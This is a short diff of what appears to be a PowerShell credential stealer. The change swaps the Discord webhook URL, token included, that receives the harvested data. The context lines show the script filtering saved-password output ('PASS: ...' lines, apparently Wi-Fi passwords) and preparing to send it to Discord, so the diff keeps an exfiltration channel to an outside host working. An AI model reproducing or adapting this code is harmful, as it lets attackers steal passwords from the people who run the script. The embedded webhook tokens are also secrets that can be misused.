@@ -158,7 +158,7 @@ Start-Sleep -Seconds 1.8
 # ========== SEND TO DISCORD (PowerShell 5.1 Compatible) ==========
 # (Unmodified section below)
 
-$WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"
+$WebhookURL = "https://discord.com/api/webhooks/1446350397366337687/RrwTNt1GBsQq73N3ztMQuZJvzwjfA8gbvxNsyHYLCaM-fSxiXiQzAHMIIubbjnXrOV18"
 if (Test-Path $outFile) {
     Write-DebugLog "File exists. Preparing to filter and send to Discord."
     $FilteredLines = Get-Content $outFile | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
@@ -218,3 +218,4 @@ if ($DebugMode) {
     Write-Output "Window will stay open. Press any key to close..."
     $null = Read-Host
 }
+
